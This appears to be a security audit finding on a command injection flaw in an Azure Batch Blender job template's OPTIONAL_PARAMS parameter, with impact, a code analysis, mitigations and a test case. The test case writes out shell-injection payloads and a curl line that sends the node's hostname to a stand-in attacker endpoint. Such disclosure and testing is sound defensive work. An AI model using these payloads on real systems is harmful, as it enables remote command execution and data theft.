- Vulnerability name: Command Injection in Blender Template via Optional Parameters
- Description: An attacker can inject arbitrary commands into the Blender command line by manipulating the `OPTIONAL_PARAMS` parameter in the job template. This is possible because the `OPTIONAL_PARAMS` environment variable, derived from the template, is directly incorporated into the command string executed by the `blender_command` function in `python-frame-splitter.py` without any sanitization. By crafting a malicious `job.template.json` or `job.parameters.json`, an attacker can control the `OPTIONAL_PARAMS` value and insert shell commands that will be executed on the Azure Batch compute node when the job is run.
- Impact:
    - Remote Command Execution: Successful exploitation allows the attacker to execute arbitrary commands on the Azure Batch compute nodes.
    - Data Exfiltration: Attackers could potentially access and exfiltrate sensitive data stored on or accessible from the compute nodes, including data from mounted storage accounts or secrets within the Batch environment.
    - System Compromise: Full compromise of the Azure Batch compute node is possible, potentially allowing for further malicious activities like lateral movement within the Azure environment or using the compute resources for cryptomining or other illicit purposes.
- Vulnerability rank: Critical
- Currently implemented mitigations: None. There is no input sanitization or validation implemented in the code to prevent command injection via `OPTIONAL_PARAMS`.
- Missing mitigations:
    - Input Sanitization: Implement robust input sanitization and validation for the `OPTIONAL_PARAMS` parameter. This should include escaping special characters that could be interpreted by the shell and potentially using a safer method to pass parameters to Blender that avoids shell interpretation altogether. Ideally, parameters should be passed as separate arguments rather than as part of a single string that is then interpreted by the shell.
    - Principle of Least Privilege: Configure Azure Batch tasks to run with the minimum necessary privileges. This would limit the scope of damage an attacker can inflict even if command injection is successful.
    - Sandboxing/Isolation: Consider sandboxing or containerizing the Batch tasks to further isolate them from the underlying compute node and limit the impact of any malicious command execution. While Azure Batch provides some level of isolation, additional layers could be beneficial.
- Preconditions:
    - The attacker must be able to supply or modify a `job.template.json` or `job.parameters.json` file that is used to create an Azure Batch job. This could occur if the attacker has control over the template repository, Batch Explorer gallery, or if a user is tricked into using a malicious template.
    - The Blender template must be used, and the attacker must be able to influence the `OPTIONAL_PARAMS` parameter.
- Source code analysis:
    - File: `/code/templates/blender/scripts/python-frame-splitter.py`
    - Function: `blender_command(blend_file, optionalParams)`
    - The `blender_command` function constructs the command line for executing Blender tasks.
    - In both Linux and Windows versions of the command construction:
      ```python
      command = "blender -b \"{}/{}\" -P \"{}/scripts/python-task-manager.py\" -y -t 0 {}" # Linux
      command = "\"%BLENDER_2018_EXEC%\" -b \"{}\\{}\" -P \"{}\\scripts\\python-task-manager.py\" -y -t 0 {}" # Windows
      ```
    - The `{}` placeholder at the end of the command string is filled with the `optionalParams` variable.
    - The `optionalParams` variable directly corresponds to the `OPTIONAL_PARAMS` environment variable, which is derived from user-controllable template parameters.
    - There is no input validation or sanitization of `optionalParams` before it is incorporated into the command, making it vulnerable to command injection.
- Security test case:
    1. **Prepare a Malicious Template:** Modify the `templates/blender/render-default-linux/job.template.json` file (or the Windows version if testing on Windows). Locate the "optionalParameters" parameter definition and change its `defaultValue` to include a command injection payload. For example, use `; touch /tmp/pwned` for Linux or `& echo pwned > C:\pwned.txt` for Windows.
        ```json
        {
           "name": "optionalParameters",
           "type": "string",
           "defaultValue": "; touch /tmp/pwned",
           "metadata": {
             "description": "Optional parameters"
           }
         }
        ```
    2. **Submit a Job:** Use Azure Batch CLI, Batch Explorer, or any tool that utilizes these templates to submit a job based on the modified Blender template. When submitting the job, select the "Render movie on Linux Server" (or Windows equivalent) action for Blender. You can use an existing pool or create a new one for testing. Ensure the job is submitted and tasks are scheduled to run.
    3. **Access a Compute Node (Optional but Recommended for Verification):** To directly verify command execution, you can connect to a compute node in the pool. This may require enabling Batch node agent and SSH/RDP access to the pool nodes.
    4. **Check for Payload Execution:**
        - **Linux:** On the compute node, use SSH to connect and execute the command `ls /tmp/pwned`. If the file `/tmp/pwned` exists, the command injection was successful.
        - **Windows:** On the compute node, use RDP to connect and check if the file `C:\pwned.txt` exists and contains the text "pwned". If it does, the command injection was successful.
    5. **Alternative Verification (Without Node Access):** If direct node access is not feasible, you can modify the payload to perform an observable action, such as:
        - **Exfiltrate Data (Example - Linux):**  `; curl -X POST -d "$(hostname)" <attacker_controlled_endpoint>`. Replace `<attacker_controlled_endpoint>` with a URL where you can receive HTTP POST requests. Check your endpoint for incoming requests from the Batch compute node's hostname.
        - **Cause a Time Delay (Example - Linux):** `; sleep 30`. Monitor the task execution time. If the task takes significantly longer than expected, it might indicate the `sleep` command was executed. Check task logs for any unusual delays or errors.

By successfully executing these steps and observing the expected outcome (file creation, data exfiltration, or time delay), you can confirm the command injection vulnerability within the Blender template due to the insecure handling of `OPTIONAL_PARAMS`.